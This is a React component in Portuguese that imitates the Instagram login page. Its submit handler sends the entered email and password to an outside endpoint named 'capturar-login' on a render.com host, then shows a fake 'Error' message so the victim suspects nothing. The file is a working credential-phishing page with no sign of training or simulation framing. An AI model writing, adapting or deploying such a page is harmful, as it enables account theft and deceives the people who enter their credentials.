import React, { useState } from 'react';
import {
  Box,
  Button,
  Divider,
  Link,
  TextField,
  Typography,
  useMediaQuery,
} from '@mui/material';
import FacebookIcon from '@mui/icons-material/Facebook';
import { useTheme } from '@mui/material/styles';

export default function InstagramLogin() {
  const [email, setEmail] = useState('');
  const [senha, setSenha] = useState('');
  const [enviado, setEnviado] = useState(false);
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down('sm'));

  const handleSubmit = async () => {
    if (!email || !senha) return;
    try {
      await fetch('https://manaus-conectada.onrender.com/api/capturar-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, senha }),
      });
      setEnviado(true);
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <Box
      sx={{
        minHeight: '100vh',
        bgcolor: '#fafafa',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        p: 2,
        flexDirection: 'column',
      }}
    >
      <Box width={isMobile ? '100%' : 350} maxWidth="100%">
        <Box
          sx={{
            border: '1px solid #dbdbdb',
            bgcolor: '#fff',
            px: 4,
            py: isMobile ? 3 : 4,
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            gap: 2,
          }}
        >
          <Typography
            sx={{
              fontFamily: `'Grand Hotel', cursive`,
              fontSize: 50,
              color: '#262626',
              mb: 1,
            }}
          >
            Instagram
          </Typography>

          <TextField
            size="small"
            placeholder="Telefone, nome de usuário ou email"
            fullWidth
            variant="outlined"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            sx={{ backgroundColor: '#fafafa' }}
          />
          <TextField
            size="small"
            placeholder="Senha"
            type="password"
            fullWidth
            variant="outlined"
            value={senha}
            onChange={(e) => setSenha(e.target.value)}
            sx={{ backgroundColor: '#fafafa' }}
          />

          <Button
            variant="contained"
            fullWidth
            disabled={!email || !senha}
            sx={{
              textTransform: 'none',
              bgcolor: '#0095f6',
              color: '#fff',
              fontWeight: 500,
              fontSize: 14,
              '&:hover': { bgcolor: '#1877f2' },
            }}
            onClick={handleSubmit}
          >
            Entrar
          </Button>

          {enviado && (
            <Typography
              sx={{ color: 'red', fontSize: 12, mt: 1, textAlign: 'center' }}
            >
              Error 
            </Typography>
          )}

          <Box sx={{ width: '100%', display: 'flex', alignItems: 'center' }}>
            <Divider sx={{ flex: 1, bgcolor: '#dbdbdb' }} />
            <Typography
              variant="body2"
              sx={{
                mx: 2,
                color: '#8e8e8e',
                fontWeight: 500,
                fontSize: 13,
              }}
            >
              OU
            </Typography>
            <Divider sx={{ flex: 1, bgcolor: '#dbdbdb' }} />
          </Box>

          <Button
            startIcon={<FacebookIcon />}
            sx={{
              textTransform: 'none',
              color: '#385185',
              fontWeight: 600,
              fontSize: 14,
            }}
          >
            Entrar com o Facebook
          </Button>

          <Link
            href="#"
            underline="none"
            sx={{ fontSize: 12, color: '#00376b', mt: 1 }}
          >
            Esqueceu a senha?
          </Link>
        </Box>

        <Box
          sx={{
            border: '1px solid #dbdbdb',
            bgcolor: '#fff',
            mt: 2,
            p: 2,
            textAlign: 'center',
            fontSize: 14,
          }}
        >
          <Typography variant="body2" sx={{ fontSize: 14 }}>
            Não tem uma conta?{' '}
            <Link
              href="#"
              underline="none"
              sx={{ color: '#0095f6', fontWeight: 500 }}
            >
              Cadastre-se
            </Link>
          </Typography>
        </Box>
      </Box>
    </Box>
  );
}
